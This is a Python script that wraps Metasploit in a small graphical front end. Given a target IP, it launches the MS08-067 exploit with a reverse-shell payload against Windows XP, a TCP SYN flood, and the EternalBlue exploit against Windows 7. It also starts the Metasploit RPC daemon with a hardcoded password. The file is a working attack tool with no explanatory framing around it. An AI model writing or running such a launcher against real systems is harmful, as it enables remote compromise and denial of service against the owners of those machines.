import eel
import os
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
eel.init("web")
@eel.expose
def winxp(ipatk,portatk):
    print(f"Current password: passwrd")
    os.system(f'msfrpcd -P passwrd -S -a 127.0.0.1')
    client=MsfRpcClient('passwrd',port=55553)
    console=MsfRpcConsole(client)
    console.execute('use exploit/windows/smb/ms08_067_netapi')
    console.execute('set RHOSTS ' + ipatk)
    console.execute('set target 53')
    console.execute('set payload windows/shell_reverse_tcp')
    console.execute('run')

@eel.expose
def dos(ipatk,portatk):
    print(f"Current password: passwrd")
    os.system(f'msfrpcd -P passwrd -S -a 127.0.0.1')
    client=MsfRpcClient('passwrd',port=55553)
    console=MsfRpcConsole(client)
    console.execute('use auxiliary/dos/tcp/synflood')
    console.execute('set RHOSTS ' + ipatk)
    console.execute('set RPORT ' + portatk)
    console.execute('run')

@eel.expose
def w7(ipatk, portatk):
    print(f"Current password: passwrd")
    os.system(f'msfrpcd -P passwrd -S -a 127.0.0.1')
    client = MsfRpcClient('passwrd', port=55553)
    console = MsfRpcConsole(client)
    console.execute('use exploit/windows/smb/ms17_010_eternalblue')
    console.execute('set RHOSTS ' + ipatk)
    console.execute('run')

eel.start("index.html", size=(735,835))